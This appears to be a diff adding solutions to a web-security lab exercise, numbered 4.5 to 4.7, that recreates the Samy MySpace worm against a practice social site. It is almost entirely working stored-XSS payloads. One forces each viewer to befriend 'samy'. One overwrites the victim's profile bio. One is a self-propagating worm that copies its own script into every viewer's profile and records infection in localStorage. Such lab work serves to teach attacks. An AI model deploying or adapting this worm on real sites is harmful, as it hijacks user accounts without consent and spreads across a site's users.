@@ -1,0 +1,57 @@
+<!-- 4.5 Add as friend :3 -->
+<script>
+    fetch("/friend", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ friend: "samy" }),
+    });
+</script>
+
+
+
+<!-- 4.6 Change the victim's bio :3 -->
+<script>
+  if (document.getElementById("username").textContent !== "samy") {
+    fetch("/profile/update", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ content: "Samy is my hero :3" }),
+    });
+  }
+</script>
+
+<!-- 4.7 Writing a self-propagating XSS worm :3 -->
+<script id=":3">
+  if (document.getElementById("username").textContent !== "samy" && !localStorage.getItem(document.getElementById("username").textContent)) { // we use line 50 to check if the user is already infected
+
+    //self propagation
+    let script_OwO = encodeURIComponent("<script id=\":3\" type=\"text/javascript\">" + document.getElementById(":3").innerHTML + "</" + "script>"); // escape " and < to avoid breaking our original script tag
+      //we used encodeURIComponent to ensure that it is websafe (i am too scared to use it as-is, never actually tested if it would work)
+
+    // uwu copy from 4.5
+    fetch("/profile/update", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ content: decodeURIComponent(script_OwO)+"Samy is my hero :3" }), // we attach the script to the bio (if encodeURI wasn't needed, then we can just get rid of decodeURIComponent)
+    });
+
+    // :3 from 4.6
+    fetch("/friend", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ friend: "samy" }),
+    });
+
+    // we can reuse the document.getElementById("username").textContent to set the infection state of the user with localStorage
+    localStorage.setItem(document.getElementById("username").textContent, true); 
+    // though there's no mention of "infected", we can simply check if the key exists
+  }
+</script>
